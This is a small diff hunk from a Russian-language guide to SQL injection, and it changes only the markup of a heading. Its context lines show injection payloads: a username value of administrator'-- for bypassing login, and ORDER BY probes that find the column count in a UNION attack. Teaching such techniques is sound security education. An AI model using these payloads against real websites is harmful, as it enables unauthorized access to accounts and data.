@@ -36,7 +36,7 @@ SQL-инъекция — это уязвимость веб-безопаснос
 
 Измените username параметр, присвоив ему значение:administrator'--
 <details>
-<summary>## 3. UNION-атака (определение колонок)</summary>
+<summary> ### 3. UNION-атака (определение колонок) </summary>
 - ' ORDER BY 1--
 - ' ORDER BY 2--
 - ' ORDER BY 3--
